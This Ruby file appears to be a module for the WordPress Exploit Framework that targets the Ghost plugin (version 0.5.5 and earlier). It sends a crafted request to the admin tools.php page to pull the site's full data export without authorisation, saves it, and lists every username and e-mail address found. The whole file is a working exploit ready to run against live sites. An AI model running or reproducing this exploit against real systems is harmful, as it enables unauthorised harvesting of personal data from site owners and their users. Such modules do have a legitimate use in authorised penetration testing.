class Wpxf::Auxiliary::GhostUnrestrictedExportDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Ghost Plugin <= 0.5.5 - Unrestricted Export Download',
      desc: 'This module utilises a lack of user level validation in versions '\
            '<= 0.5.5 of the Ghost plugin to download an export of the WordPress '\
            'data, including usernames and e-mail addresses.',
      author: [
        'Josh Brody',                      # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8479']
      ],
      date: 'May 02 2016'
    )

    register_options([
      Wpxf::Options::IntegerOption.new(
        name: 'http_client_timeout',
        desc: 'Max wait time in seconds for HTTP responses',
        default: 300,
        required: true
      ),
      Wpxf::Options::StringOption.new(
        name: 'export_path',
        desc: 'The file to save the JSON export to',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('ghost', '0.5.6')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def download_url
    normalize_uri(wordpress_url_admin, 'tools.php')
  end

  def print_detected_users
    file = File.read(export_path)
    json = JSON.parse(file)
    users = json['data']['users']

    if users
      users_table = [{ name: 'Username', email: 'E-mail' }]
      users.each do |user|
        users_table.push(name: user['name'], email: user['email'])
      end

      emit_success "Found #{users.length} users"
      emit_table users_table
    end
  rescue
    emit_error 'Failed to parse the download. The plugin may be disabled or the export may be corrupt.'
  end

  def run
    return false unless super

    emit_info 'Downloading website export...'
    res = download_file(
      url: download_url,
      method: :get,
      params: { 'ghostexport' => 'true', 'submit' => 'Download Ghost file' },
      local_filename: export_path
    )

    if res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    print_detected_users
    emit_success "Saved export to #{export_path}"
    true
  end
end
